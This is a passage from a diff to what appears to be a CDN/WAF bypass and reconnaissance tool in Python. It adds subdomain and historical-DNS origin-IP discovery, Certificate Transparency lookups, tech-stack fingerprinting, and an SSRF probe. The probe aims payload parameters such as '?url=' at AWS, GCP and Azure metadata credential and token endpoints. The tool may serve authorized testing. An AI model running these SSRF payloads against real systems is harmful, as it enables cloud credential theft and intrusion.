+                'technique': f"Subdomain: {sub['subdomain']}",
+                'bypass': is_potentially_unprotected,
+                'status': sub['status'],
+                'reason': f"IP: {sub['ip']} | Server: {sub['server']}",
+                'severity': 'MEDIUM' if is_potentially_unprotected else 'INFO',
+                'category': 'SUBDOMAIN_ENUM',
+                'details': sub
+            }
+            results.append(result)
+            
+            status_icon = "[✓]" if is_potentially_unprotected else "[+]"
+            print(f"  {status_icon} Found: {sub['subdomain']} ({sub['ip']})")
+        
+        if not found_subdomains:
+            print("  [*] No additional subdomains found via DNS enumeration")
+        
+        return results
+    
+    def _historical_dns_lookup(self) -> List[Dict[str, Any]]:
+        """Historical DNS lookup to find origin IPs (passive recon)"""
+        results = []
+        print("  [*] Checking historical DNS records...")
+        
+        # Note: These are public APIs that may have rate limits
+        dns_history_sources = [
+            f"https://api.hackertarget.com/dnslookup/?q={self.domain}",
+            f"https://api.hackertarget.com/hostsearch/?q={self.domain}",
+        ]
+        
+        found_records = []
+        
+        for source in dns_history_sources:
+            try:
+                resp = self._session.get(source, timeout=10, verify=False)
+                if resp and resp.status_code == 200 and 'error' not in resp.text.lower():
+                    lines = resp.text.strip().split('\n')
+                    for line in lines[:10]:  # Limit results
+                        if line and ',' in line:
+                            parts = line.split(',')
+                            if len(parts) >= 2:
+                                found_records.append({
+                                    'host': parts[0],
+                                    'ip': parts[1],
+                                    'source': 'HackerTarget'
+                                })
+            except Exception as e:
+                logger.debug(f"DNS history lookup error: {e}")
+        
+        # Try to identify origin IPs (non-CDN IPs)
+        cdn_ip_ranges = ['104.16.', '104.17.', '104.18.', '13.', '52.', '54.']  # Common CDN ranges
+        
+        for record in found_records:
+            ip = record['ip']
+            is_cdn = any(ip.startswith(prefix) for prefix in cdn_ip_ranges)
+            
+            result = {
+                'technique': f"Historical DNS: {record['host']}",
+                'bypass': not is_cdn,
+                'status': 200,
+                'reason': f"IP: {ip} | Source: {record['source']}",
+                'severity': 'HIGH' if not is_cdn else 'INFO',
+                'category': 'DNS_HISTORY',
+                'details': record
+            }
+            results.append(result)
+            
+            if not is_cdn:
+                print(f"  [✓] Potential Origin IP: {ip} ({record['host']})")
+        
+        if not found_records:
+            print("  [*] No historical DNS records found via public APIs")
+        
+        return results
+    
+    def _certificate_transparency_lookup(self) -> List[Dict[str, Any]]:
+        """Certificate Transparency log lookup to discover related domains"""
+        results = []
+        print("  [*] Checking Certificate Transparency logs...")
+        
+        # Extract base domain
+        domain_parts = self.domain.split('.')
+        if len(domain_parts) >= 2:
+            base_domain = '.'.join(domain_parts[-2:])
+        else:
+            base_domain = self.domain
+        
+        try:
+            # Use crt.sh API (Certificate Transparency)
+            ct_url = f"https://crt.sh/?q=%.{base_domain}&output=json"
+            resp = self._session.get(ct_url, timeout=15, verify=False)
+            
+            if resp and resp.status_code == 200:
+                try:
+                    certs = resp.json()
+                    
+                    # Extract unique domain names
+                    domains_found = set()
+                    for cert in certs[:100]:  # Limit to first 100 certs
+                        name_value = cert.get('name_value', '')
+                        for domain in name_value.split('\n'):
+                            domain = domain.strip().lstrip('*.')
+                            if domain and base_domain in domain:
+                                domains_found.add(domain)
+                    
+                    # Filter out the main domain and duplicates
+                    domains_found.discard(self.domain)
+                    domains_found.discard(f'www.{base_domain}')
+                    
+                    for domain in list(domains_found)[:20]:  # Limit results
+                        result = {
+                            'technique': f"CT Log: {domain}",
+                            'bypass': False,
+                            'status': 200,
+                            'reason': 'Found in Certificate Transparency logs',
+                            'severity': 'INFO',
+                            'category': 'CT_LOGS',
+                            'details': {'domain': domain}
+                        }
+                        results.append(result)
+                        print(f"  [+] CT Domain: {domain}")
+                    
+                    if domains_found:
+                        print(f"  [+] Found {len(domains_found)} related domains in CT logs")
+                    else:
+                        print("  [*] No additional domains found in CT logs")
+                        
+                except Exception as e:
+                    logger.debug(f"CT log parse error: {e}")
+                    
+        except Exception as e:
+            logger.debug(f"CT lookup error: {e}")
+            print("  [!] Certificate Transparency lookup failed")
+        
+        return results
+    
+    def _test_cloud_metadata_enumeration(self) -> List[Dict[str, Any]]:
+        """Test for cloud metadata endpoint access (IMDS)"""
+        results = []
+        print("  [*] Testing cloud metadata enumeration (IMDS)...")
+        
+        # Cloud metadata endpoints
+        metadata_endpoints = [
+            # AWS IMDSv1
+            ('http://169.254.169.254/latest/meta-data/', 'AWS IMDSv1'),
+            ('http://169.254.169.254/latest/meta-data/iam/security-credentials/', 'AWS IAM Credentials'),
+            ('http://169.254.169.254/latest/user-data/', 'AWS User Data'),
+            ('http://169.254.169.254/latest/dynamic/instance-identity/document', 'AWS Instance Identity'),
+            
+            # AWS IMDSv2 (requires token)
+            ('http://169.254.169.254/latest/api/token', 'AWS IMDSv2 Token'),
+            
+            # GCP
+            ('http://169.254.169.254/computeMetadata/v1/', 'GCP Metadata'),
+            ('http://metadata.google.internal/computeMetadata/v1/', 'GCP Internal Metadata'),
+            ('http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token', 'GCP Service Account Token'),
+            
+            # Azure
+            ('http://169.254.169.254/metadata/instance?api-version=2021-02-01', 'Azure IMDS'),
+            ('http://169.254.169.254/metadata/identity/oauth2/token', 'Azure Managed Identity'),
+            
+            # DigitalOcean
+            ('http://169.254.169.254/metadata/v1/', 'DigitalOcean Metadata'),
+            
+            # Alibaba Cloud
+            ('http://100.100.100.200/latest/meta-data/', 'Alibaba Cloud Metadata'),
+            
+            # Oracle Cloud
+            ('http://169.254.169.254/opc/v1/instance/', 'Oracle Cloud Metadata'),
+        ]
+        
+        # Test via SSRF payloads
+        ssrf_payloads = [
+            '?url={}',
+            '?redirect={}',
+            '?link={}',
+            '?fetch={}',
+            '?target={}',
+            '?proxy={}',
+            '?dest={}',
+        ]
+        
+        for metadata_url, cloud_type in metadata_endpoints:
+            # Direct test (if target is the application)
+            for ssrf_param in ssrf_payloads[:3]:  # Limit test variations
+                test_url = f"{self.target}{ssrf_param.format(quote(metadata_url))}"
+                
+                try:
+                    headers = {'X-Technique': f'IMDS: {cloud_type}'}
+                    if 'GCP' in cloud_type:
+                        headers['Metadata-Flavor'] = 'Google'
+                    if 'Azure' in cloud_type:
+                        headers['Metadata'] = 'true'
+                    
+                    resp = safe_request(test_url, headers=headers, timeout=3)
+                    
+                    if resp and resp.status_code == 200:
+                        # Check for metadata indicators
+                        body = resp.text.lower()
+                        if any(ind in body for ind in ['ami-', 'instance-id', 'local-ipv4', 'access_token', 'project-id', 'subscription']):
+                            result = {
+                                'technique': f'Cloud Metadata: {cloud_type}',
+                                'bypass': True,
+                                'status': resp.status_code,
+                                'reason': f'SSRF to {cloud_type} metadata endpoint successful',
+                                'severity': 'CRITICAL',
+                                'category': 'CLOUD_METADATA'
+                            }
+                            results.append(result)
+                            print(f"  [✓] CRITICAL: {cloud_type} metadata accessible!")
+                            
+                except Exception as e:
+                    logger.debug(f"IMDS test error: {e}")
+        
+        if not results:
+            print("  [*] No cloud metadata endpoints accessible via SSRF")
+        
+        return results
+    
+    def _fingerprint_technology_stack(self) -> List[Dict[str, Any]]:
+        """Fingerprint backend technology stack (frameworks, CMS, languages)"""
+        results = []
+        print("  [*] Fingerprinting technology stack...")
+        
+        try:
+            resp = safe_request(self.target, timeout=self.timeout, allow_redirects=True)
+            if not resp:
+                return results
+            
+            body_lower = resp.text.lower()
+            headers_lower = {k.lower(): v.lower() for k, v in resp.headers.items()}
+            cookies_str = str(resp.cookies.get_dict()).lower()
+            
+            detected_tech = {
+                'frameworks': [],
+                'cms': [],
+                'servers': [],
+                'languages': [],
+            }
+            
+            # Check frameworks
+            for tech_name, signatures in TECHNOLOGY_SIGNATURES['frameworks'].items():
+                confidence = 0
+                matched = []
+                
+                for header in signatures.get('headers', []):
+                    if header.lower() in headers_lower:
+                        confidence += 30
+                        matched.append(f"Header: {header}")
+                
+                for cookie in signatures.get('cookies', []):
+                    if cookie.lower() in cookies_str:
+                        confidence += 30
+                        matched.append(f"Cookie: {cookie}")
+                
+                for pattern in signatures.get('patterns', []):
+                    if pattern.lower() in body_lower or pattern.lower() in str(headers_lower):
+                        confidence += 25
+                        matched.append(f"Pattern: {pattern}")
+                
+                if confidence > 0:
+                    detected_tech['frameworks'].append({
+                        'name': tech_name,
+                        'confidence': min(confidence, 100),
+                        'indicators': matched
+                    })
+            
+            # Check CMS
+            for cms_name, signatures in TECHNOLOGY_SIGNATURES['cms'].items():
+                confidence = 0
+                matched = []
+                
+                for pattern in signatures.get('patterns', []):
+                    if pattern.lower() in body_lower:
+                        confidence += 35
+                        matched.append(f"Pattern: {pattern}")
+                
+                for cookie in signatures.get('cookies', []):
+                    if cookie.lower() in cookies_str:
+                        confidence += 30
+                        matched.append(f"Cookie: {cookie}")
+                
+                if confidence > 0:
+                    detected_tech['cms'].append({
+                        'name': cms_name,
+                        'confidence': min(confidence, 100),
+                        'indicators': matched
+                    })
+            
+            # Check servers
+            server_header = headers_lower.get('server', '')
+            for server_name, signatures in TECHNOLOGY_SIGNATURES['servers'].items():
+                for pattern in signatures.get('patterns', []):
+                    if pattern.lower() in server_header:
+                        detected_tech['servers'].append({
+                            'name': server_name,
+                            'confidence': 90,
+                            'indicators': [f"Server: {server_header}"]
+                        })
+                        break
+            
+            # Check languages
+            for lang_name, signatures in TECHNOLOGY_SIGNATURES['languages'].items():
+                confidence = 0
+                matched = []
+                
+                for header in signatures.get('headers', []):
+                    if header.lower() in headers_lower:
+                        header_value = headers_lower.get(header.lower(), '')
+                        if lang_name.lower() in header_value:
+                            confidence += 40
+                            matched.append(f"Header: {header}={header_value}")
+                
+                for pattern in signatures.get('patterns', []):
+                    if pattern.lower() in body_lower or pattern.lower() in str(headers_lower) or pattern.lower() in cookies_str:
+                        confidence += 25
+                        matched.append(f"Pattern: {pattern}")
+                
+                if confidence > 0:
+                    detected_tech['languages'].append({
+                        'name': lang_name,
+                        'confidence': min(confidence, 100),
+                        'indicators': matched
+                    })
+            
+            # Generate results
+            for category, techs in detected_tech.items():
+                for tech in techs:
+                    severity = 'MEDIUM' if tech['confidence'] >= 60 else 'LOW'
+                    result = {
+                        'technique': f"Tech Stack ({category}): {tech['name'].upper()}",
+                        'bypass': False,
+                        'status': resp.status_code,
+                        'reason': f"Confidence: {tech['confidence']}% - {', '.join(tech['indicators'][:2])}",
+                        'severity': severity,
+                        'category': 'TECH_FINGERPRINT',
+                        'details': tech
+                    }
+                    results.append(result)
+                    print(f"  [+] {category.title()}: {tech['name'].upper()} (Confidence: {tech['confidence']}%)")
+            
+            if not any(detected_tech.values()):
+                print("  [*] No specific technology signatures detected")
+                
+        except Exception as e:
+            logger.debug(f"Tech fingerprinting error: {e}")
+        
         return results
 
 
@@ -1594,17 +2751,17 @@ def main():
             
             if low:
                 print(f"\n🔵 LOW ({len(low)}):")
-                for r in low[:5]:  # Show first 5
+                for r in low:
                     print(f"  - {r['technique']}")
-                if len(low) > 5:
-                    print(f"  ... and {len(low) - 5} more")
+                    if r.get('reason'):
+                        print(f"    Reason: {r['reason']}")
             
             if info:
                 print(f"\nℹ️  INFO ({len(info)}):")
-                for r in info[:10]:  # Show first 10
+                for r in info:
                     print(f"  - {r['technique']}")
-                if len(info) > 10:
-                    print(f"  ... and {len(info) - 10} more")
+                    if r.get('reason'):
+                        print(f"    Reason: {r['reason']}")
         else:
             print("✅ No bypasses found - target is properly protected")
         
